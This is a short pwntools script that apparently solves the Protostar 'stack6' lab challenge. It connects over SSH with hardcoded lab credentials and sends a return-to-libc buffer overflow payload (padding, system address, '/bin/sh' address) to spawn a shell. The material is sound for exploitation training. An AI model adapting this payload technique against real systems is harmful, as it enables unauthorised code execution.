#!/usr/bin/env python
# $Id: stack6.py,v 1.0 2018/06/17 19:10:42 dhn Exp $

from pwn import *

level = 6
host = "10.168.142.133"
user = "user"
chal = "stack%i" % level
password  = "user"
binary   = "/opt/protostar/bin/%s" % chal
shell = ssh(host=host, user=user, password=password)

padding = "A" * 80
system = p32(0xb7ecffb0)

# strings -a -t x  /lib/libc-2.11.2.so | grep "/bin/sh"
# libc + offset (0xb7e97000 + 11f3bf)
bin_sh = p32(0xb7fb63bf)

payload = padding
payload += system
payload += "A" * 4
payload += bin_sh

r = shell.run(binary, tty=False)
r.recvuntil("input path please:")
r.sendline(payload)
r.interactive()
r.clean()

log.success("Done!")
